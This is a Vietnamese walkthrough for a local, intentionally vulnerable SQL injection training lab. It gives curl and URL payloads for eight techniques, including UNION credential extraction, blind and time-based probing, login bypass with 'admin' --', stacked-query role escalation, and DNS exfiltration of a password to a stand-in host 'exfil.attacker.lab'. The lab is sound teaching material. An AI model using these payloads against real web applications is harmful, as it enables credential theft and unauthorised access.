# Hướng dẫn chạy khai thác từng trường hợp — SQLi Lab

> ⚠️ Chỉ chạy trên `127.0.0.1`. Lab giáo dục, cố ý chứa lỗ hổng.

## Bước 0 — Khởi động

```bash
cd sqli-lab
source .venv/bin/activate          # nếu dùng venv
python3 init_db.py                 # tạo/reset DB sạch
```

- **Terminal 1** — server nạn nhân: `python3 app.py` → http://127.0.0.1:5000
- **Terminal 2** — server attacker (chỉ cho bài OOB): `python3 oob_collector.py` → http://127.0.0.1:5001 (xem `/log`)
- **Terminal 3** — nơi gõ khai thác.

Gọn hơn: `./run.sh` tự chạy cả app + collector.

---

## 1. Error-based
```bash
python3 exploit.py error
```
Thủ công:
```bash
curl "http://127.0.0.1:5000/products?id=1'"
```
→ Lộ `OperationalError` = injectable. `1 AND 1=1` khác `1 AND 1=2`.

## 2. UNION-based
```bash
python3 exploit.py union
```
Thủ công (trình duyệt):
```
/products?id=1 ORDER BY 4                                   → lỗi ⇒ 3 cột
/products?id=0 UNION SELECT id,username,password FROM users
/products?id=0 UNION SELECT 1,name,flag FROM admin_secrets
```
→ Lấy creds + `FLAG{m4nu4l_sql1_m4st3r}`.

## 3. Boolean blind
```bash
python3 exploit.py boolean
```
Thủ công:
```bash
curl "http://127.0.0.1:5000/check?username=admin' AND substr(password,1,1)='S' -- "   # EXISTS
curl "http://127.0.0.1:5000/check?username=admin' AND substr(password,1,1)='X' -- "   # NOT FOUND
```
→ Binary-search ra full password + flag.

## 4. Time-based blind  (chậm)
```bash
python3 exploit.py time
```
Thủ công (đo thời gian):
```bash
curl -s -o /dev/null -w "%{time_total}s\n" \
 "http://127.0.0.1:5000/track?code=x' UNION SELECT sleep(3) -- "     # ~3s ⇒ dính
```

## 5. Out-of-band (OOB)   [cần oob_collector.py chạy]
```bash
python3 exploit.py oob
```
Thủ công:
```bash
curl "http://127.0.0.1:5000/lookup?host=x' UNION SELECT dns_lookup(hex((SELECT password FROM users WHERE username='admin'))||'.exfil.attacker.lab') -- "
```
→ Mở http://127.0.0.1:5001/log xem dữ liệu đánh cắp (đã giải mã hex). Dữ liệu **không** có trong response app 5000.

## 6. Authentication bypass
```bash
python3 exploit.py authbypass
```
Thủ công (`/login`): username = `admin' -- ` (dấu cách cuối), password bất kỳ.
```bash
curl -s -i -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" | grep Location
```

## 7. Stacked queries   (đổi DB → reset sau khi chạy)
```bash
python3 exploit.py stacked
python3 init_db.py
```
Thủ công (ô tên ở `/feedback`):
```
a', 'x'); UPDATE users SET role='admin' WHERE username='alice'; -- 
```

## 8. Second-order   (đổi DB → reset sau khi chạy)
```bash
python3 exploit.py secondorder
python3 init_db.py
```
Thủ công: đăng ký `/register` username = `x' UNION SELECT id, flag, 3 FROM admin_secrets -- ` rồi mở `/profile`. Test nhanh:
```
/profile?u=x' UNION SELECT id,flag,3 FROM admin_secrets -- 
```

---

## Chạy tất cả
```bash
python3 exploit.py all        # CHẬM ở bài time-based; nên chạy từng bài
```

## Lưu ý
- Payload có dấu cách / `'`: để trong nháy kép, hoặc URL-encode (` `→`%20`, `'`→`%27`).
- POST luôn dùng `--data-urlencode` (Werkzeug cắt body tại `;`).
- Sau `stacked`/`secondorder` luôn `python3 init_db.py` để reset.
- OOB cần collector bật; nếu không, app vẫn trả lời bình thường (đúng bản chất blind).

## Kết quả kỳ vọng (đã kiểm chứng end-to-end)
| # | Kỹ thuật | Kết quả |
|---|----------|---------|
| 1 | Error-based | Lộ lỗi SQL, phân biệt 1=1 vs 1=2 |
| 2 | UNION | version 3.x, 4 creds, flag |
| 3 | Boolean | `S3cr3t_Admin_2024!` + flag |
| 4 | Time-based | trễ ~3s khi điều kiện đúng |
| 5 | OOB | exfil password + flag về `/log` |
| 6 | Auth bypass | vào admin không cần mật khẩu |
| 7 | Stacked | alice `user → admin` |
| 8 | Second-order | flag qua `/profile` |
